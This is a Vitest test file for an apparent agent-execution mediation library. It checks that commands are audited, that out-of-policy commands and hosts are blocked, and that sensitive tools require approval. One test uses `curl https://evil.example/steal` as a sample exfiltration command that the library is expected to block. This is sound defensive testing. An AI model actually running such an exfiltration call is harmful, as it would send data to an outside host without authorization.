import { mkdir, writeFile, mkdtemp } from "node:fs/promises";
import os from "node:os";
import path from "node:path";

import { describe, expect, it } from "vitest";

import {
  checkNetworkAccess,
  createProtectedWorkspace,
  mediateToolInvocation,
  readAgentAuditEvents,
  runMediatedCommand,
} from "../src/index.js";

async function sessionFixture() {
  const root = await mkdtemp(path.join(os.tmpdir(), "sano-agent-exec-fixture-"));
  const agentHome = await mkdtemp(path.join(os.tmpdir(), "sano-agent-exec-home-"));
  process.env.SANO_AGENT_HOME = agentHome;
  await mkdir(path.join(root, "src"), { recursive: true });
  await writeFile(path.join(root, "src", "ok.txt"), "safe", "utf8");
  return createProtectedWorkspace({ projectPath: root });
}

describe("Agent Protect execution mediation", () => {
  it("runs allowed commands inside the protected workspace and audits the decision", async () => {
    const manifest = await sessionFixture();
    const result = await runMediatedCommand({
      sessionId: manifest.id,
      command: process.execPath,
      args: ["-e", "console.log(process.cwd())"],
    });

    expect(result.decision.effect).toBe("ALLOW");
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain(manifest.workspacePath);
    expect(await readAgentAuditEvents()).toEqual([
      expect.objectContaining({
        sessionId: manifest.id,
        action: "command_exec",
        decision: "ALLOW",
        status: "allowed",
        commandHash: expect.any(String),
      }),
    ]);
  });

  it("blocks commands and network targets that are outside policy", async () => {
    const manifest = await sessionFixture();
    const blockedCommand = await runMediatedCommand({
      sessionId: manifest.id,
      command: "curl",
      args: ["https://evil.example/steal"],
    });
    const blockedNetwork = await checkNetworkAccess({
      sessionId: manifest.id,
      target: "https://evil.example",
    });

    expect(blockedCommand.decision).toMatchObject({
      effect: "BLOCK",
      reasonCode: "blocked_command",
    });
    expect(blockedNetwork).toMatchObject({
      effect: "BLOCK",
      reasonCode: "network_host_not_allowed",
    });
  });

  it("marks sensitive tools as blocked or requiring approval", async () => {
    const manifest = await sessionFixture();

    await expect(
      mediateToolInvocation({ sessionId: manifest.id, toolName: "shell.unmediated" }),
    ).resolves.toMatchObject({ effect: "BLOCK" });
    await expect(
      mediateToolInvocation({ sessionId: manifest.id, toolName: "github.write" }),
    ).resolves.toMatchObject({ effect: "REQUIRE_APPROVAL" });
    await expect(
      mediateToolInvocation({ sessionId: manifest.id, toolName: "read.docs" }),
    ).resolves.toMatchObject({ effect: "ALLOW" });
  });
});
